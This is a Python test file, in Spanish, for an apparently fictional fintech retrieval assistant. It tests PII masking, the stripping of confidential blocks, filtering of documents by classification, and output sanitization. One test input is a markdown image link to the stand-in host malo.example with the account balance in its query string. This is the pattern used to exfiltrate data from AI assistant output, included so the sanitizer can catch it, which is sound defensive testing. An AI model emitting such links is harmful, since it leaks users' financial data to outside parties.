from conftest import pendiente

from finnorte import controles, pii
from finnorte.retrieval import Fragmento, Resultado


@pendiente("Avance 2")
def test_enmascara_pii_comun():
    texto = "Escríbeme a ana.ruiz@finnorte.mx o al 81 5550 9012; CLABE 002180700000000019; tarjeta 4111 1111 1111 1111"
    limpio, mapa = pii.enmascarar(texto)
    for valor in ["ana.ruiz@finnorte.mx", "5550 9012", "002180700000000019", "4111 1111 1111 1111"]:
        assert valor not in limpio
    assert len(mapa) == 4


@pendiente("Avance 2")
def test_bloque_confidencial_no_sale():
    limpio, _ = pii.enmascarar("Hola [CONFIDENCIAL]umbral 48,500[/CONFIDENCIAL] adiós")
    assert "48,500" not in limpio


@pendiente("Avance 2")
def test_filtra_documentos_confidenciales():
    frag = lambda c: Resultado(Fragmento("x#0", "x", "t", "texto", {"clasificacion": c}), 0.9)
    assert len(controles.filtrar_clasificacion([frag("interna"), frag("confidencial"), frag("publica")])) == 2


@pendiente("Avance 2")
def test_sanea_imagenes_y_urls_externas():
    texto, avisos = controles.sanear_salida("Ver ![x](https://malo.example/p.png?d=SALDO) y https://docs.finnorte.mx/api")
    assert "malo.example" not in texto and "docs.finnorte.mx" in texto and avisos
